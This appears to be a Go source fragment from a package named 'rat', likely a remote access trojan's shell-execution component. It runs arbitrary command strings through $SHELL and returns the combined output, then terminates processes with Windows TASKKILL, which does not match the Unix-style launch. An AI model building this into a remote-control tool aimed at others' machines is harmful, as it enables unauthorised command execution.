package rat

import (
	"io"
	"os"
	"os/exec"
	"syscall"
    "strconv"
)

type ShellCommand interface {
	io.ReadCloser
}

type shellCommand struct {
	cmd *exec.Cmd
	io.Reader
}

func NewShellCommand(c string) (ShellCommand, error) {
	sc := &shellCommand{}

	sc.cmd = exec.Command(os.Getenv("SHELL"), "-c", c)
	sc.cmd.SysProcAttr = &syscall.SysProcAttr{}
	var (
		stdout io.Reader
		stderr io.Reader
		err    error
	)

	if stdout, err = sc.cmd.StdoutPipe(); err != nil {
		return sc, err
	}

	if stderr, err = sc.cmd.StderrPipe(); err != nil {
		return sc, err
	}

	sc.Reader = io.MultiReader(stdout, stderr)

	err = sc.cmd.Start()

	return sc, err
}

func (sc *shellCommand) Close() error {
	//err := syscall.Kill(-sc.cmd.Process.Pid, syscall.SIGTERM)
    kill := exec.Command("TASKKILL", "/T", "/F", "/PID", strconv.Itoa(sc.cmd.Process.Pid))
    kill.Stderr = os.Stderr
    kill.Stdout = os.Stdout
    kill.Run()
    //return kill.Run()
	//sc.cmd.Wait()
	return nil
}
